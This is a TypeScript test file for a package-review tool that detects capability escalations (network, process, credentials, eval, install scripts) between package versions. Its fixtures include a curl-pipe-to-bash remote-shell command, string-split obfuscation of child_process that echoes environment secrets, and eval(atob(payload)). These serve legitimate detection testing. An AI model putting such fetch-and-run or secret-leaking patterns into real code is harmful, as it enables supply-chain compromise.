import { describe, expect, test } from "vitest";
import {
  CAPABILITY_ORDER,
  diffCapabilities,
  normalizeCapabilityDelta,
  projectCapabilities,
  type CapabilitySet,
  type FileRecord,
} from "../server/lib/review";
import { matchDeterministicCodeCapabilities } from "../server/lib/review/rules/scripts";

function file(path: string, textSample?: string, flags: string[] = []): FileRecord {
  return { path, size: textSample?.length ?? 0, sha256: "abc", flags, textSample };
}

function set(overrides: Partial<CapabilitySet> = {}): CapabilitySet {
  return { capabilities: [], inspectedFiles: 1, uninspectedFiles: 0, complete: true, ...overrides };
}

describe("projectCapabilities", () => {
  test("maps each pattern family to its capability", () => {
    const projected = projectCapabilities(
      [
        file("net.js", "import https from 'node:http';\nfetch('https://x.example');"),
        file("proc.js", "const { execSync } = require('child_process');"),
        file("creds.js", "const token = process.env.NPM_TOKEN;"),
        file("eval.js", "eval(atob(payload));"),
      ],
      null,
    );
    expect(projected.capabilities).toEqual(["network", "process", "credentials", "dynamicEval"]);
    expect(projected.inspectedFiles).toBe(4);
    expect(projected.complete).toBe(true);
  });

  test("a benign file projects nothing", () => {
    const projected = projectCapabilities([file("index.js", "export const value = 1;\n")], null);
    expect(projected.capabilities).toEqual([]);
  });

  test("uses deterministic path filters and common-environment exclusions", () => {
    const projected = projectCapabilities(
      [
        file("README.md", "Use require('child_process') when extending this package."),
        file("index.d.ts", "export type Child = typeof import('child_process');"),
        file("index.js", "export const production = process.env.NODE_ENV === 'production';"),
      ],
      null,
    );
    expect(projected.capabilities).toEqual([]);
    expect(projected.inspectedFiles).toBe(1);
  });

  test("projects capabilities found only after deterministic constant folding", () => {
    const projected = projectCapabilities(
      [
        file(
          "index.js",
          "const cp = require(['chi', 'ld_pro', 'cess'].join(''));\n" +
            "const secret = globalThis['proc' + 'ess']['e' + 'nv'];\n" +
            "cp['exec' + 'Sync']('echo ' + secret);\n",
        ),
      ],
      null,
    );
    expect(projected.capabilities).toEqual(["process", "credentials"]);
  });

  test("a remote-shell command implies both network and process", () => {
    const projected = projectCapabilities(
      [file("install.sh", "curl -s https://x.example/run | bash")],
      null,
    );
    expect(projected.capabilities).toEqual(["network", "process"]);
  });

  test("python patterns apply for the python pattern set only", () => {
    const files = [file("setup.py", "import subprocess\nsubprocess.run(['ls'])")];
    expect(projectCapabilities(files, null, "python").capabilities).toEqual(["process"]);
    expect(projectCapabilities(files, null, "javascript").capabilities).toEqual([]);
  });

  test("native capability comes from magic-byte flags or extension", () => {
    expect(
      projectCapabilities([file("prebuilt", undefined, ["binary", "native-elf"])], null)
        .capabilities,
    ).toEqual(["native"]);
    expect(projectCapabilities([file("addon.node")], null).capabilities).toEqual(["native"]);
  });

  test("install scripts come from lifecycle scripts, implicit scripts, and gypfile", () => {
    expect(
      projectCapabilities([], { scripts: { postinstall: "node setup.js" } }).capabilities,
    ).toEqual(["installScripts"]);
    expect(
      projectCapabilities([], { implicitScripts: { install: "node-gyp rebuild" } }).capabilities,
    ).toEqual(["installScripts"]);
    expect(projectCapabilities([], { gypfile: true }).capabilities).toEqual(["installScripts"]);
    // Non-consumer lifecycle scripts (build, test) are not install capability.
    expect(projectCapabilities([], { scripts: { build: "tsc" } }).capabilities).toEqual([]);
  });

  test("bin capability accepts both manifest spellings", () => {
    expect(projectCapabilities([], { bin: "./cli.js" }).capabilities).toEqual(["bin"]);
    expect(projectCapabilities([], { bin: { tool: "./cli.js" } }).capabilities).toEqual(["bin"]);
    expect(projectCapabilities([], { bin: {} }).capabilities).toEqual([]);
  });

  test("content-skipped bodies count as uninspected and break completeness", () => {
    const projected = projectCapabilities(
      [
        file("index.js", "export const value = 1;\n"),
        file("blob.bin", undefined, ["content-skipped"]),
      ],
      null,
    );
    expect(projected.inspectedFiles).toBe(1);
    expect(projected.uninspectedFiles).toBe(1);
    expect(projected.complete).toBe(false);
  });

  test("sample-skipped minified scripts are coverage holes; inert skipped files are not", () => {
    // The parser retains no text for minified bundles — exactly where real
    // payloads hide — so a confident "no escalation" over one would be a lie.
    const projected = projectCapabilities(
      [file("dist/index.min.js", undefined, ["text-sample-skipped"])],
      null,
    );
    expect(projected.uninspectedFiles).toBe(1);
    expect(projected.complete).toBe(false);

    // Source maps and minified stylesheets cannot execute in the consumer's
    // runtime, so their skipped samples do not break completeness.
    const inert = projectCapabilities(
      [
        file("dist/index.js.map", undefined, ["text-sample-skipped"]),
        file("dist/styles.min.css", undefined, ["text-sample-skipped"]),
      ],
      null,
    );
    expect(inert.uninspectedFiles).toBe(0);
    expect(inert.complete).toBe(true);
  });

  test("a baseline-truncated body still projects from its head but breaks completeness", () => {
    const projected = projectCapabilities(
      [file("big.js", "const { execSync } = require('child_process');\n", ["baseline-truncated"])],
      null,
    );
    // The clipped head is real evidence — but the tail could hide more, so
    // the file counts as a coverage hole rather than an inspected body.
    expect(projected.capabilities).toEqual(["process"]);
    expect(projected.inspectedFiles).toBe(0);
    expect(projected.uninspectedFiles).toBe(1);
    expect(projected.complete).toBe(false);
  });

  test("output order is canonical regardless of discovery order", () => {
    const projected = projectCapabilities([file("a.js", "eval(x); fetch('https://x.example');")], {
      bin: "./cli.js",
    });
    expect(projected.capabilities).toEqual(
      CAPABILITY_ORDER.filter((capability) => projected.capabilities.includes(capability)),
    );
  });
});

describe("matchDeterministicCodeCapabilities", () => {
  test("shares exclusions and normalization with deterministic findings", () => {
    expect(
      matchDeterministicCodeCapabilities("README.md", "require('child_process')", "javascript"),
    ).toBeNull();

    const commonEnvironment = matchDeterministicCodeCapabilities(
      "index.js",
      "process.env.NODE_ENV",
      "javascript",
    );
    expect(commonEnvironment?.credentialAccess.matched).toBe(false);

    const assembled = matchDeterministicCodeCapabilities(
      "index.js",
      "require(['chi', 'ld_pro', 'cess'].join(''))",
      "javascript",
    );
    expect(assembled?.processExecution).toMatchObject({ matched: true, obfuscated: true });
  });

  test("shares remote-shell execution conditions", () => {
    const buildStep = matchDeterministicCodeCapabilities(
      "Dockerfile",
      "RUN curl -s https://example.invalid/install | bash",
      "javascript",
    );
    expect(buildStep?.remoteShell.matched).toBe(true);
    expect(buildStep?.remoteShellCapability).toBe(false);

    const lifecycleStep = matchDeterministicCodeCapabilities(
      "scripts/install.sh",
      "curl -s https://example.invalid/install",
      "javascript",
      { lifecycleScriptFile: true },
    );
    expect(lifecycleStep?.remoteShellCapability).toBe(true);
  });
});

describe("diffCapabilities", () => {
  test("computes escalations and reductions", () => {
    const delta = diffCapabilities(
      set({ capabilities: ["process"] }),
      set({ capabilities: ["network", "process"] }),
    );
    expect(delta.escalations).toEqual(["network"]);
    expect(delta.reductions).toEqual([]);
    expect(delta.confident).toBe(true);

    const reduced = diffCapabilities(
      set({ capabilities: ["network", "process"] }),
      set({ capabilities: ["process"] }),
    );
    expect(reduced.escalations).toEqual([]);
    expect(reduced.reductions).toEqual(["network"]);
  });

  test("a missing baseline yields no escalations and no confidence", () => {
    const delta = diffCapabilities(null, set({ capabilities: ["network"] }));
    expect(delta.from).toBeNull();
    expect(delta.escalations).toEqual([]);
    expect(delta.confident).toBe(false);
  });

  test("uninspected bytes on either side break confidence", () => {
    const incomplete = set({ uninspectedFiles: 2, complete: false });
    expect(diffCapabilities(incomplete, set()).confident).toBe(false);
    expect(diffCapabilities(set(), incomplete).confident).toBe(false);
  });
});

describe("normalizeCapabilityDelta", () => {
  const valid = diffCapabilities(
    set({ capabilities: ["process"] }),
    set({ capabilities: ["network"] }),
  );

  test("round-trips a freshly computed delta", () => {
    expect(normalizeCapabilityDelta(JSON.parse(JSON.stringify(valid)))).toEqual(valid);
  });

  test("rejects garbage, unknown capabilities, and malformed counters", () => {
    expect(normalizeCapabilityDelta(null)).toBeNull();
    expect(normalizeCapabilityDelta({})).toBeNull();
    expect(
      normalizeCapabilityDelta({ ...valid, to: { ...valid.to, capabilities: ["filesystem"] } }),
    ).toBeNull();
    expect(
      normalizeCapabilityDelta({ ...valid, to: { ...valid.to, uninspectedFiles: -1 } }),
    ).toBeNull();
  });

  test("recomputes confidence instead of trusting the persisted flag", () => {
    const tampered = JSON.parse(JSON.stringify(valid)) as Record<string, unknown>;
    (tampered.to as Record<string, unknown>).uninspectedFiles = 3;
    tampered.confident = true;
    const normalized = normalizeCapabilityDelta(tampered);
    expect(normalized?.confident).toBe(false);
    expect(normalized?.to.complete).toBe(false);
  });
});
